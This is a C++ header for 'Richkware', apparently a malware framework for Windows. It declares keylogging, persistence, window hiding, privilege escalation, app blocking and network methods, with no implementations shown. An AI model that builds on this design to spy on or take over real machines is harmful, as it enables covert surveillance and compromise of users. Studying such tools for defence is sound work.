/*
 *      Copyright 2016 Riccardo Melioli. All Rights Reserved.
 */

#ifndef RICHKWARE_H_
#define RICHKWARE_H_

#include <winsock2.h>
#include <windows.h>
#include <shellapi.h>
#include <winbase.h>
#include <winreg.h>
#include <winuser.h>

#include <fstream>
#include <stdio.h>
#include <stdlib.h>
#include <conio.h>
#include <string.h>
#include <cstring>
#include <string>
#include <iterator>
#include <list>
#include <map>

#include "crypto.h"
#include "blockApps.h"
#include "network.h"

class Richkware {
private:
	std::map<std::string, std::string> session;
	std::string appName;

	void SaveValueReg(const char* path, const char* key, const char* value);
	std::string LoadValueReg(const char* path, const char* key);
	void SaveValueToFile(const char* value, const char* path = NULL);
	std::string LoadValueFromFile(const char* path = NULL);

	void SaveSession(const char* encryptionKey);
	void LoadSession(const char* encryptionKey);

public:
	const char* encryptionKey;
	BlockApps blockApps;
	Network network;

	Richkware(const char* AppNameArg, const char* EncryptionKeyArg);

	void SaveInfo(const char* key, const char* value);
	std::string FindInfo(const char* key);
	void RemoveInfo(const char* key);
	
	BOOL IsAdmin();
	void RequestAdminPrivileges();
	void Persistance();
	void StealthWindow(const char* window);
	void OpenApp(const char* app);
	void Keylogger(const char* fileName);
	bool CheckSession();
	bool CheckPersistance();
	
	void Hibernation();
	void RandMouse();

};

DWORD WINAPI KeyloggerThread(void* arg);

#endif /* RICHKWARE_H_ */
